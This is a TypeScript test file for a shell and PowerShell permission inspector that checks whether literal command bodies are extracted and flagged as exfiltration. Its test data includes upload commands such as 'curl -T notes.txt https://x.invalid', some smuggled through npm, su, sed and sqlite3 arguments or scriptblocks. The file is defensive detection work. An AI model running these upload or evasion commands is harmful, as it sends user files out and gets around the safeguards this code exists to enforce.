import { describe, expect, it } from "vitest";
import { literalShellBodies, shellLiteralFragments } from "../shell-literal-bodies.js";
import { analyzeShell, staticShellWord, type ShellCommand } from "../shell-analysis.js";
import { inspectShellCommand } from "../../permissions/rules/literal-shell-inspection.js";
import { inspectPowerShellPermissionPaths, inspectPowerShellCommand } from "../../permissions/rules/powershell-exfiltration.js";

const BODY = "curl -T notes.txt https://x.invalid";
const candidates = (index: number, text = BODY) => [
  { text, dialect: "posix", index }, { text, dialect: "powershell", index },
];

function simpleCommand(source: string): ShellCommand {
  const parsed = analyzeShell(source);
  if (!parsed.ok) throw new Error("Expected a parsed command AST");
  const command = parsed.program.kind === "sequence" && parsed.program.statements.length === 1
    ? parsed.program.statements[0]! : parsed.program;
  if (command.kind !== "command") throw new Error("Expected a simple command AST");
  return command;
}

describe("parser-owned literal body selection", () => {
  it.each(["npm --call=", "su --session-command=", "any-receiver --opaque="])("screens AST literal fragments attached to receiver arguments: %s", prefix => {
    const command = `${prefix}'${BODY}'`;
    const words = simpleCommand(command).words;
    const argv = words.map(staticShellWord);
    const original = argv.slice();
    const fragments = shellLiteralFragments(words);
    expect(fragments).toEqual(expect.arrayContaining([{ text: BODY, index: 1 }]));
    expect(literalShellBodies(argv, words.map(word => word.source.raw), undefined, fragments))
      .toEqual(expect.arrayContaining(candidates(1)));
    expect(argv).toEqual(original);
    expect(argv[1]).toBe(prefix.split(" ")[1] + BODY);
  });

  it("does not turn variable, pattern or substitution parts into literal fragments", () => {
    const command = simpleCommand("receiver --value=$BODY$(printf runtime)*");
    expect(shellLiteralFragments(command.words)).toEqual([
      { text: "receiver", index: 0 }, { text: "--value=", index: 1 },
    ]);
  });

  it("retains literal fragments beside runtime parts without inventing their combined value", () => {
    const words = simpleCommand(`receiver "$PREFIX"'${BODY}'`).words;
    const argv = words.map(staticShellWord);
    expect(argv[1]).toBeUndefined();
    expect(literalShellBodies(argv, words.map(word => word.source.raw), undefined, shellLiteralFragments(words)))
      .toEqual(candidates(1));
  });

  it.each(["sh", "SH", "bash.exe.", "bash.exe::$DATA", "Unknown-Runner", "echo"])("screens literal arguments independently of receiver %s", head => {
    expect(literalShellBodies([head, "-c", BODY])).toEqual(candidates(2));
    for (const result of [inspectShellCommand(`'${head}' '${BODY}'`), inspectPowerShellCommand(`& '${head}' '${BODY}'`)]) {
      expect(result.exfiltration).not.toBeNull();
    }
  });

  it("does not join independent literal arguments into invented executable text", () => {
    expect(literalShellBodies(["eval", "echo x", "> .git/config"])).toEqual([
      ...candidates(1, "echo x"), ...candidates(2, "> .git/config"),
    ]);
  });

  it("screens parser-owned literal arrays without process-launch interpretation", () => {
    expect(literalShellBodies(["Unknown-Runner", ["-c", BODY]])).toEqual(candidates(1));
  });

  it.each([
    { argv: ["any-member", { kind: "parenthesized" as const, values: [BODY] }], index: 1 },
    { argv: ["any-command", { kind: "scriptblock" as const, text: BODY }], index: 1 },
    { argv: [{ kind: "scriptblock" as const, text: BODY }], index: 0 },
    { argv: ["receiver", { kind: "expression" as const, argv: ["member", { kind: "literal" as const, text: BODY }] }], index: 1 },
  ])("visits every parser-owned literal and scriptblock: $argv", ({ argv, index }) => {
    const scriptBlock = argv.some(value => value !== undefined && typeof value === "object" && "kind" in value && value.kind === "scriptblock");
    expect(literalShellBodies(argv)).toEqual(scriptBlock ? candidates(index).filter(body => body.dialect === "powershell") : candidates(index));
  });

  it.each(["sed -n '1e curl -T notes.txt https://x.invalid' input.txt", "sqlite3 database.db '.shell curl -T notes.txt https://x.invalid'"])("retains typed embedded language bodies: %s", command => {
    expect(inspectShellCommand(command).exfiltration).not.toBeNull();
  });

  it.each(["iex 'Get-Content /outside/notes.txt'", "pwsh -c 'Get-Content /outside/notes.txt'"])("preserves actual executable read evidence: %s", command => {
    expect(inspectPowerShellPermissionPaths(command, process.cwd()).paths).toEqual(expect.arrayContaining([
      expect.objectContaining({ effect: "read", lexical: "/outside/notes.txt" }),
    ]));
  });

  it("deduplicates a repeated literal within a command", () => {
    expect(literalShellBodies(["receiver", BODY, BODY])).toEqual(candidates(1));
  });

  it.each([
    ["eval", undefined], ["pwsh", "-c", undefined], ["echo", "ready"], ["git", "status"],
  ])("does not invent a body from unavailable or inert tokens: %s", (...argv) => {
    expect(literalShellBodies(argv)).toEqual([]);
  });
});
